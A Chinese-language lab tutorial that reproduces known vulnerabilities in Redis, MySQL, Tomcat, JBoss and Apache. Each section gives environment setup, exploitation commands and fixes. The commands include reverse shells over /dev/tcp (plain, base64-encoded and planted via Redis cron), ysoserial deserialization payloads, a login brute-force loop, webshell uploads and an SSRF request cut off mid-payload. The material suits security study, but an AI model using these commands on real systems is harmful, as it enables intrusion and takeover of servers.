**连接redis，写入反弹shell(下面以Centos系统为例)**

```php
redis-cli -h 192.168.0.1
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.3/8888 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

![image-20220122235629586](image/image-20220122235629586.png)

**过一分钟后成功反弹Shell** 

```php
nc -lvp 8888
```

![image-20220122235654659](image/image-20220122235654659.png)



##### 方法四：利用主从复制RCE

```php
  Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，即可通过加载恶意so文件来RCE。
```

**下载exp到本地：**[**https://github.com/vulhub/redis-rogue-getshell**](https://github.com/vulhub/redis-rogue-getshell)

```php
git clone https://github.com/vulhub/redis-rogue-getshell.git
```

**下载完成后，解压压缩包，然后进入到redis-rogue-getshell/RedisModulesSDK/exp目录下编译exp.so文件**

```php
unzip redis-rogue-getshell.zip
cd redis-rogue-getshell/RedisModulesSDK/exp
make
```

![image.png](image/1636688339988-0eec7238-32af-4ef2-b57b-27cd684a0595.png)

编译完成后会在当前目录下会生成一个exp.so，将其复制到redis-rogue-server目录下**
![image.png](image/1636688396869-abde3d47-4bbf-4263-9954-618f6a4660e0.png)
**使用redis-master.py脚本攻击执行命令**

```php
python3 redis-master.py --rhost 192.168.0.1 --rport 6379 --lhost 192.168.0.138 			--lport 9999 -f exp.so -c whoami
```

![image-20220123000001055](image/image-20220123000001055.png)



#### 漏洞修复

1. 禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的"#bind 127.0.0.1" ，去掉前面的"#"即可（Redis本来就是作为内存数据库，只要监听在本机即可）；
2. 设置密码访问认证，可通过修改redis.conf配置文件中的"requirepass" 设置复杂密码 （需要重启Redis服务才能生效）；
3. 对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器；
4. 修改Redis默认端口，将默认的6379端口修改为其他端口；
5. 禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项"RENAME_CONFIG"，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度；
6. Redis使用普通用户权限，禁止使用 root 权限启动Redis 服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限；



## Mysql漏洞复现

### Mysql 身份认证绕过漏洞(CVE-2012-2122)

#### 漏洞简介

```php
  当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。
```

#### 影响版本

```php
MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not
MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.
```

#### 环境搭建

```
docker pull vulhub/mysql:5.5.23
docker run -d -p 3306:3306 vulhub/mysql:5.5.23
```

#### 漏洞复现

##### bash脚本攻击

在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：

```php
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 172.18.0.2 -P3306 ; done
```

![image-20220123005239092](image/image-20220123005239092.png)

![image-20220123005248684](image/image-20220123005248684.png)

##### python脚本攻击

```php
#!/usr/bin/python
import subprocess
while 1:
        subprocess.Popen("mysql -u root mysql -h 172.18.0.2 --password=baah", shell=True).wait()
```

![image-20220123005359009](image/image-20220123005359009.png)

![image-20220123005407724](image/image-20220123005407724.png)



#### 漏洞修复

**目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：** http://www.mysql.com/







# 中间件漏洞复现

## tomcat漏洞复现

```php
Tomcat服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache服务器的扩展，但运行时它是独立运行的，所以当运行tomcat时，它实际上作为一个与Apache独立的进程单独运行的。

目前版本型号7~10版本！

默认端口：8080
```

### tomcat 弱口令Getshell

#### 漏洞描述

```php
  Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。 通过弱口令登录后台，部署war包geshell
```

#### 影响版本

```php
tomcat 全版本
```

#### 环境搭建

```php
vulfocus tomcat-pass-getshell 弱口令
```

#### 漏洞复现

1、打开tomcat管理页面 http://ip/manager/html，就是我们正常访问tomcat页面：

![image-20220107104257133](image/image-20220107104257133.png)

2、输入弱口令tomcat/tomcat成功登录到后台

![image-20220107104406190](image/image-20220107104406190.png)

3、将jsp Webshell压缩为zip，再将zip后缀改名为war，然后tomcat页面上上传war包

![image-20220107104638478](image/image-20220107104638478.png)

![image-20220107104657962](image/image-20220107104657962.png)

4、上传成功后会在管理页面上显示，接下来用蚁剑去连接

![image-20220107104806151](image/image-20220107104806151.png)

链接地址：http://ip/shell/shell.jsp

![image-20220107104841863](image/image-20220107104841863.png)



#### 漏洞修复

1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。

2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。

3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。

4）后台管理避免弱口令。



------

### Tomcat 任意文件写入（CVE-2017-12615）

#### 漏洞简述

```php
  2017年9月19日，Apache Tomcat 官方确认并修复了两个高危漏洞，漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0-7.80之间，官方评级为高危，在一定条件下，攻击者可以利用这两个漏洞，获取用户服务器上 JSP 文件的源代码，或是通过精心构造的攻击请求，向用户服务器上传恶意 JSP 文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。
```

#### 影响版本

```php
Apache Tomcat 7.0.0 - 7.0.79 (windows环境)
Apache Tomcat 7.0.0 - 7.0.80
```

#### 利用条件

- CVE-2017-12615 漏洞利用需要在 Windows 环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数，需要手工添加，默认配置条件下不受此漏洞影响。
- CVE-2017-12616 漏洞需要在 server.xml 文件配置 VirtualDirContext 参数，经过实际测试，Tomcat 7.x 版本内默认配置无 VirtualDirContext 参数，需要手工添加，默认配置条件下不受此漏洞影响。

#### 环境搭建

```php
docker pull vulhub/tomcat:8.5.19
docker run -d -P vulhub/tomcat:8.5.19
```

#### 漏洞复现

第一种方式：通过curl发送PUT请求包进行文件上传

```
curl -X PUT "http://192.168.22.1:55358/1.jsp/" -d '<%out.println("hello world!");%>'
```

![image-20220107110705748](image/image-20220107110705748.png)

2、第二种方式：通过burpsuite发送数据包上传

![image-20220107111421875](image/image-20220107111421875.png)

![image-20220107111429716](image/image-20220107111429716.png)

#### 漏洞修复

1、 PUT默认是关闭的。如果开启了，可将conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。
2、升级到稳定版本。



------

###  tomcat AJP 任意文件读取/包含漏洞（CVE-2020-1938）

#### 漏洞简述

```php
	Tomcat 是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。
```

#### 影响版本

```php
Apache Tomcat 6
7 <= Apache Tomcat < 7.0.100
8 <= Apache Tomcat < 8.5.51
9 <= Apache Tomcat < 9.0.31
```

#### 环境搭建

```php
vulfocus tomcat 代码执行 (CVE-2020-1938)
```

#### 漏洞复现

1、扫描目标开放端口，开启了两个端口8080（tomcat服务）和8009（AJP服务）

```
nmap -p- -sV 172.17.0.3
```

![image-20220107112419356](image/image-20220107112419356.png)

2、访问目标主机8080端口，页面显示找不到页面，但从返回信息中得到了目标运行的tomcat版本为7.0.57

![image-20220107112654949](image/image-20220107112654949.png)

3、下载exp脚本进行攻击

下载地址：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

![image-20220107113614249](image/image-20220107113614249.png)



![image-20220107112608437](image/image-20220107112608437.png)

![image-20220107112643696](image/image-20220107112643696.png)

#### 漏洞修复

（1）临时禁用AJP协议端口，在conf/server.xml配置文件中注释掉：<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />

（2）配置ajp配置中的secretRequired跟secret属性来限制认证

（3）下载更新版本。



------

### tomcat 反序列化 （CVE-2020-9484）

#### 漏洞简述

```php
 Apache Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器。 成功利用此漏洞需要同时满足以下4个条件: 1.攻击者能够控制服务器上文件的内容和文件名称； 2.服务器PersistenceManager配置中使用了FileStore； 3.PersistenceManager中的sessionAttributeValueClassNameFilter被配置为“null”，或者过滤器不够严格，导致允许攻击者提供反序列化数据的对象； 4.攻击者知道使用的FileStore存储位置到攻击者可控文件的相对路径
```

#### 影响版本

```php
Apache Tomcat 10.0.0-M1—10.0.0-M4
Apache Tomcat 9.0.0.M1—9.0.34
Apache Tomcat 8.5.0—8.5.54
Apache Tomcat 7.0.0—7.0.103
```

#### 环境搭建

```bash
sudo docker pull vision12345/cve-2020-9484
sudo docker run -p 8088:8080  --name tomcat -d vision12345/cve-2020-9484
```

#### 漏洞复现

（1）下载ysoserial 一个生成java反序列化 payload 的 .jar 包

执行下面语句生成 payload

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar Groovy1 "touch /tmp/2333" > /tmp/test.session
```

![image-20220107130852537](image/image-20220107130852537.png)

（2）用curl发起请求通过JSESSION加载恶意的session持久化文件

```bash
curl 'http://172.17.0.3:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/test'
```

![image-20220107131126578](image/image-20220107131126578.png)

（3）执行 ls -l /tmp 查看结果

```bash
ls -l /tmp
```

![image-20220107131053466](image/image-20220107131053466.png)

#### 漏洞修复

通用修补建议：

- 升级到 Apache Tomcat 10.0.0-M5 及以上版本
- 升级到 Apache Tomcat 9.0.35 及以上版本
- 升级到 Apache Tomcat 8.5.55 及以上版本
- 升级到 Apache Tomcat 7.0.104 及以上版本

临时修补建议：

禁止使用`Session`持久化功能`FileStore`。





## Jboss漏洞复现

### Administration Console 弱口令

#### 漏洞简介

```php
Administration Console 管理页面存在弱口令，登录后台可以上传 war 
```

#### 影响版本

```
jboss全版本
```

#### 漏洞验证

1、允许访问administrator Console页面

2、用户密码为弱口令

#### 漏洞复现

1、admin/admin 弱口令登录，点击 add a new resource 上传 war 包

![image-20220106031026447](image/image-20220106031026447.png)

2、将Webshell木马打包成war包，将其上传到目标服务器上

```
jar -cvf shell.war ./shell.jsp
```

![image-20220106032908137](image/image-20220106032908137.png)

![image-20220106031447981](image/image-20220106031447981.png)

3、冰蝎成功连接Webshell

```
连接url：http://192.168.0.1:8081/shell/shell.jsp
```

![image-20220106032840627](image/image-20220106032840627.png)

#### 漏洞修复

（1）修改密码，密码文件路径为

```
C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties
```

（2）删除 Administration Console 页面



------

### JMX Console 未授权访问漏洞

#### 漏洞简介

```php
访问控制不严导致的漏洞，默认情况下访问ip:8080/jmx-console就可以访问管理控制台，不需要输入用户名和密码就可以直接浏览 JBoss 的部署管理的信息，部署上传木马，存在安全隐患。
```

#### 影响版本

```php
jboss全版本
```

#### 漏洞验证

1、允许未授权访问jmx-console页面

![image-20220106033330751](image/image-20220106033330751.png)

#### 漏洞复现

1、将Webshell木马打包成war包，并用python开启一个简易版的http服务器

```
jar -cvf shell.war ./shell.jsp
python3 -m http.server 8000
```

![image-20220106033620431](image/image-20220106033620431.png)

2、进入 JXM Console 之后，找到 jboss.system，然后点击service=MainDeployer

![image-20220106034959173](image/image-20220106034959173.png)

3、找到methodIndex为17 or 19的deploy，把远程的war包填入进去，进行远程war包的部署

![image-20220106035121385](image/image-20220106035121385.png)

![image-20220106035135468](image/image-20220106035135468.png)

4、部署完成之后，冰蝎成功连接Webshell

```
连接url：http://192.168.0.1:8081/shell/shell.jsp
```

![image-20220106034826978](image/image-20220106034826978.png)

#### 漏洞修复

1、关闭 jmx-console 和 web-console，提高安全性。



------

###  JBoss EJBInvokerServlet 反序列化漏洞（CVE-2013-4810）

#### 漏洞简介

```php
  此漏洞和CVE-2015-7501漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中JMXInvokerServlet和EJBInvokerServlet利用的是org.jboss.invocation.MarshalledValue进行的反序列化操作，而web-console/Invoker利用的是org.jboss.console.remote.RemoteMBeanInvocation进行反序列化并上传构造的文件。
```

#### 影响版本

```php
jboss 6.x 版本
```

#### 漏洞检测

```php
http://192.168.0.1:57792/invoker/JMXInvokerServlet
```

此漏洞存在于JBoss中/invoker[JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![image-20220106014702393](image/image-20220106014702393.png)



#### 漏洞利用

1、构造bash反弹shell的Payload，由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。

编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

![image-20220106014914177](image/image-20220106014914177.png)

2、序列化数据生成，利用ysoserial.jar包的CommonsCollections5链把要执行的反弹shell生成一个ser文件

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" > shell.ser
```

![image-20220106015837208](image/image-20220106015837208.png)

3、本地监听9999端口（需要和上面反弹shell的端口一致）

```bash
nc -lvvp 9999
```

![image-20220106020038164](image/image-20220106020038164.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:8080/invoker/EJBInvokerServlet --data-binary @shell.ser
```

![image-20220106020255219](image/image-20220106020255219.png)

![image-20220106020321315](image/image-20220106020321315.png)

#### 漏洞修复

1. 删除`http-invoker.sar`组件

2. 设置`http-invoker`

   ```java
   XML
   jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml
   
   在security-constraint 标签中添加以下代码
   <url-pattern>/*</url-pattern>
   ```

3. 升级JBoss版本



------

### jboss 反序列化 （CVE-2015-7501）

#### 漏洞简介

```php
这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。
```

#### 影响版本

```php
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0
```

#### 环境搭建

```php
环境: vulfocus jboss CVE-2015-7501
```

#### 漏洞检测

```php
http://192.168.0.1:57792/invoker/JMXInvokerServlet
```

此漏洞存在于JBoss中/invoker[JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![image-20220106014702393](image/image-20220106014702393-16429044504154.png)



#### 漏洞复现

1、构造bash反弹shell的Payload，由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。

编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

![image-20220106014914177](image/image-20220106014914177-16429044504165.png)

2、序列化数据生成，利用ysoserial.jar包的CommonsCollections5链把要执行的反弹shell生成一个ser文件

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" > shell.ser
```

![image-20220106015837208](image/image-20220106015837208-16429044504166.png)

3、本地监听9999端口（需要和上面反弹shell的端口一致）

```bash
nc -lvvp 9999
```

![image-20220106020038164](image/image-20220106020038164-16429044504167.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:57792/invoker/JMXInvokerServlet --data-binary @shell.ser
```

![image-20220106020255219](image/image-20220106020255219-16429044504168.png)

![image-20220106020321315](image/image-20220106020321315-16429044504169.png)

#### 漏洞修复

目前厂商已经发布了升级补丁以修复这个[安全](http://8u.hn.cn/linuxaq/)问题，请到厂商的主页[下载](http://8u.hn.cn/linuxdown/)：

https://access.redhat.com/security/cve/cve-2015-7501



------

###  jboss 反序列化 （CVE-2017-7504）

#### 漏洞简介

```php
 Jboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
```

#### 影响版本

```php
Red Hat JBoss Application Server <=4.x
```

#### 环境搭建

```php
环境: vulfocus jboss CVE-2017-7504
```

#### 漏洞复现

1、下载漏洞利用工具，编译并生成序列化数据

JavaDeserH2HC：https://github.com/joaomatosf/JavaDeserH2HC

```php
git clone https://github.com/joaomatosf/JavaDeserH2HC.git
cd JavaDeserH2HC/
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
```

![image-20220106021751273](image/image-20220106021751273.png)

2、设置反弹IP和端口

```php
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.0.1/9999 0>&1"
```

![image-20220106021846079](image/image-20220106021846079.png)

3、服务器运行nc监听

```php
nc -lvp 9999
```

![image-20220106021918928](image/image-20220106021918928.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:60581/jboss/mq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![image-20220106022002961](image/image-20220106022002961.png)

![image-20220106022038320](image/image-20220106022038320.png)

#### 漏洞修复

1、升级jboss为高版本

2、删除**/jboss/mq-httpil/HTTPServerILServlet**接口





------

### Jboss 代码执行 (CVE-2017-12149)

#### 漏洞简介

```php
  该漏洞为Java反序列化错误类型,存在于jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化,从而导致了漏洞。
```

#### 影响版本

```php
Jboss 5.x
Jboss 6.x
```

#### 环境搭建

```php
环境: vulfocus jboss CVE-2017-12149
```

#### 漏洞验证

1、下载漏洞利用工具，编译并生成序列化数据

JavaDeserH2HC：https://github.com/joaomatosf/JavaDeserH2HC

```php
git clone https://github.com/joaomatosf/JavaDeserH2HC.git
cd JavaDeserH2HC/
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
```

![image-20220106021751273](image/image-20220106021751273.png)

2、设置反弹IP和端口

```php
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.0.1/9999 0>&1"
```

![image-20220106021846079](image/image-20220106021846079.png)

3、服务器运行nc监听

```php
nc -lvp 9999
```

![image-20220106021918928](image/image-20220106021918928.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:8081/invoker/readonly --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![image-20220106023215993](image/image-20220106023215993.png)

![image-20220106022038320](image/image-20220106022038320.png)

#### 漏洞修复

1、升级至不受影响的版本。
2、删除http-invoker.sar 组件。
3、添加如下代码至 http-invoker.sar 下 web.xml的security-constraint 标签中：/*用于对 http invoker 组件进行访问控制。







## Apache漏洞复现

### Apache HTTPD 多后缀解析漏洞

#### 漏洞简述

```php
 Apache Httpd支持一个文件拥有多个后缀,不同的后缀执行不同的命令,也就是说当我们上传的文件中只要后缀名含有php,该文件就可以被解析成php文件。

```

#### 漏洞原理

Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：

```
AddType text/html .html
AddLanguage zh-CN .cn
```

其给`.html`后缀增加了media-type，值为`text/html`；给`.cn`后缀增加了语言，值为`zh-CN`。此时，如果用户请求文件`index.cn.html`，他将返回一个中文的html页面。

以上就是Apache多后缀的特性。如果运维人员给`.php`后缀增加了处理器：

```
AddHandler application/x-httpd-php .php
```

那么，在有多个后缀的情况下，只要一个文件含有`.php`后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。

#### 影响版本

```
该漏洞和apache版本和php版本无关,属于用户配置不当造成的解析漏洞
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/httpd/apache_parsing_vulnerability
docker-compose up -d
```

#### 漏洞复现

（1）`http://your-ip/index.php`中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为`info.php.jpg`或`info.php.jpeg`的文件，利用Apache解析漏洞进行getshell。

![image-20220123184115733](image/image-20220123184115733.png)

![image-20220123184141331](image/image-20220123184141331.png)





------

### Apache SSI 远程命令执行漏洞

#### 漏洞简述

```php
  SSI(server-side includes): 是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。
  以上是定义采用在Apache官网对SSI的定义，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。
  开启SSI需要单独配置Apache，可以参考SSI配置。SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。
  文件名保存为test.shtml,这个后缀取决于Apache的配置，默认是此后缀。
  当后台对扩展名校验不严格是。
  可以上传此类文件，达到执行命令，获取webshell的目的。
```

#### 利用条件

```php
目标服务器开启了SSI与CGI支持
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/httpd/ssi-rce/
docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:8080/upload.php`，即可看到一个上传表单。

![image-20220123184841235](image/image-20220123184841235.png)

（2）正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：

```php
<!--#exec cmd="ls" -->
```

![image-20220123185106870](image/image-20220123185106870.png)

（3）成功上传，然后访问shell.shtml，可见命令已成功执行：

![image-20220123185145263](image/image-20220123185145263.png)





------

### Apache 解析漏洞（CVE-2017-15715）

#### 漏洞简介

```PHP
Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\X0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略
```

#### 影响版本

```php
Apache 2.4.0~2.4.29
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/httpd/CVE-2017-15715
docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:8080`，有一个上传页面

![image-20220123180859249](image/image-20220123180859249.png)

（2）上传一个名为info.php的文件，被拦截：

![image-20220123182035404](image/image-20220123182035404.png)

（2）在info.php后面插入一个`\x0A`（注意，不能是`\x0D\x0A`，只能是一个`\x0A`），不再拦截：

![image-20220123182203274](image/image-20220123182203274.png)

（3）访问刚才上传的`/info.php%0a`，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：

![image-20220123182218873](image/image-20220123182218873.png)





------

### Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）

#### 漏洞简述

```php
Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。
```

#### 影响版本

```php
Apache HTTP Server 2.4.48 以下版本
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/httpd/CVE-2017-15715
docker-compose up -d
```

#### 漏洞复现

（1）启动成功之后访问本地ip的8080端口，Apache HTTP Server 作为客户端和后端 Tomcat 服务器之间的中间反向代理运行，它们通过 AJP 协议进行通信。

![image-20220123182611441](image/image-20220123182611441.png)

（2）在本地主机上新建一个test.txt文件，然后用python3开启一个简易版的HTTP服务器

![image-20220123182917541](image/image-20220123182917541.png)

（3）发送以下请求以利用 SSRF 漏洞：

```
http://192.168.22.1:8080/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA